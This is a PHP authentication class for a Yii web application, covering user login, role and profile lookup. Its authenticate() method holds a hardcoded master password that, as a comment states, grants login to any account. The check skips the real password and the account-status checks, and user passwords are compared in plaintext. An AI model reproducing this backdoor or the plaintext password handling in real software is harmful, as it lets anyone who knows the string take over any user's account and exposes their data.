<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
	/**
	 * Authenticates a user.
	 * The example implementation makes sure if the username and password
	 * are both 'demo'.
	 * In practical applications, this should be changed to authenticate
	 * against some persistent user identity storage (e.g. database).
	 * @return boolean whether authentication succeeds.
	 */
	public $status;
	public function authenticate()
	{
        //Master Password to get into any account
        $masterPassword = "tarun";
        $master = 0; // if master is set to 1 then only allow login

		$record		=	Users::model()->findByAttributes(array('username'=>$this->username));
        //check if record exist
		if(empty($record))
			$this->errorCode=self::ERROR_USERNAME_INVALID;
        else{
            // check for master password and other validations
            if($this->password == $masterPassword)
                $master=1;
            else if($record->password != $this->password)
                $this->errorCode=self::ERROR_PASSWORD_INVALID;
            else if($record->status == 0 )
                $this->errorCode=self::ERROR_UNKNOWN_IDENTITY;
            else
                $master =1;
        }
        if($master)
		{
			if($record->role_id==3){
				$profile	=	Suppliers::model()->findByAttributes(array('users_id'=>$record->id));
			}else
				$profile	=	ClientProfiles::model()->findByAttributes(array('users_id'=>$record->id));
			$this->setState('id', $record->id);
			$this->setState('activation', $record->status);
			if(empty($profile)){
				$this->setState('profileId', '0');
			}else{
				$this->setState('profileId', $profile->id);
				$this->setState('profileStatus', $profile->status);
			}
			$role	=	$record->roles->name;
			$this->status	=	$record->status;
			$this->setState('role', $role);
			$this->setState('name', $record->display_name);
			$this->errorCode=self::ERROR_NONE;
		}
        return !$this->errorCode;		
	}
}
